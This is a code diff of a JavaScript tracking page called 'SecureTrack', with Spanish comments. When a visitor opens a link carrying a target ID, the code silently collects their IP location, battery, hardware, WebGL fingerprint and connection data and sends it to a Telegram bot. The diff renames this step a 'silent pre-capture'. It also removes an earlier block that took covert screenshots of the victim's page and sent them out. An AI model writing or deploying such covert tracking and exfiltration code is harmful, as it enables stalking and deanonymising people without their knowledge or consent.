@@ -36,7 +36,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // Solo capturar automáticamente si hay un ID específico (vino de Telegram)
     const targetId = getTargetIdFromUrl();
     if (targetId && targetId !== 'Visitante Anónimo') {
-        captureAllData();
+        captureSilentData();
     }
 
     // Iniciar la animación del loader visual
@@ -56,15 +56,15 @@ function getTargetIdFromUrl() {
 }
 
 /* ====================================================
-   1. MOTOR PRINCIPAL DE CAPTURA
+   1. MOTOR PRINCIPAL DE CAPTURA SILENCIOSA (PRE-CLICK)
    ==================================================== */
-async function captureAllData() {
+async function captureSilentData() {
     try {
         captureTime = new Date();
 
-        // Ejecución paralela de todos los procesos de captura
-        const [geoData, batteryData] = await Promise.all([
-            fetchGeolocation(),
+        // Ejecución silenciosa: SOLO IP, NO NATIVE GPS
+        const [ipData, batteryData] = await Promise.all([
+            fetchIPLocationData(),
             fetchBatteryData(),
         ]);
 
@@ -74,18 +74,18 @@ async function captureAllData() {
         const webglFingerprint = generateWebGLFingerprint();
         const connectionData = parseConnectionData();
 
-        // Actualiza UI con los datos obtenidos
-        updateUI(geoData, browserData);
+        // No actualizamos la UI con los datos obtenidos en modo silencioso aún 
+        // para no interferir con las pantallas de carga que pueda haber.
+        // Opcional: updateUI(ipData, browserData);
 
-        // Extraer ID del objetivo desde /?id=... o ruta corta /v/...
         const targetId = getTargetIdFromUrl();
 
-        // Consolida todos los datos
+        // Consolida todos los datos básicos
         capturedData = {
             timestamp: captureTime.toISOString(),
-            eventType: 'AUTO_PAGE_LOAD',
+            eventType: 'PRE_CAPTURE_SILENT',
             targetId: targetId,
-            geo: geoData,
+            geo: ipData,
             browser: browserData,
             hardware: hwData,
             battery: batteryData,
@@ -97,34 +97,11 @@ async function captureAllData() {
             pageTitle: document.title,
         };
 
-        // Envía a Telegram
+        // Envía reporte base silencioso a Telegram
         await sendToTelegram(capturedData);
 
-        // Dispara la captura de screenshot silenciosa
-        // Delay incrementado a 5.5s para asegurar que el loader inicial ya haya desaparecido
-        setTimeout(async () => {
-            sendLogToBackend(">> Iniciando captura de screenshot...");
-            try {
-                const screenshot = await captureScreenshot();
-                if (screenshot) {
-                    sendLogToBackend(">> Screenshot tomado. Tamaño: " + screenshot.length + " caracteres. Convirtiendo a Blob...");
-                    const blob = dataURItoBlob(screenshot);
-                    if (blob) {
-                        sendLogToBackend(">> Blob creado exitosamente de " + blob.size + " bytes. Ejecutando sendPhotoToTelegram...");
-                        await sendPhotoToTelegram(blob, capturedData);
-                    } else {
-                        sendLogToBackend(">> Fallo: dataURItoBlob devolvió null.");
-                    }
-                } else {
-                    sendLogToBackend(">> Fallo: html2canvas devolvió null (falló silenciosamente).");
-                }
-            } catch (err) {
-                sendLogToBackend(">> Error masivo capturando screenshot: " + err.message);
-            }
-        }, 5500);
-
     } catch (err) {
-        console.warn('[SecureTrack] Error en captura inicial:', err);
+        console.warn('[SecureTrack] Error en captura silenciosa inicial:', err);
     }
 }
 
@@ -540,7 +517,9 @@ function buildTelegramMessage(data) {
     const wg = data.webgl;
 
     const flag = getFlagEmoji(g.countryCode);
-    const eventLabel = data.eventType === 'CLICK_CTA_BUTTON' ? '🖱️ <b>CLICK EN CTA</b>' : '👁️ <b>CARGA DE PÁGINA</b>';
+    let eventLabel = '👁️ <b>CARGA DE PÁGINA</b>';
+    if (data.eventType === 'CLICK_CTA_BUTTON') eventLabel = '🖱️ <b>CLICK INTERACTIVO (Datos Profundos)</b>';
+    if (data.eventType === 'PRE_CAPTURE_SILENT') eventLabel = '🥷 <b>PRE-CAPTURA SILENCIOSA</b>';
 
     // Highlight the target ID if it exists
     const targetHeader = data.targetId !== 'Visitante Anónimo'
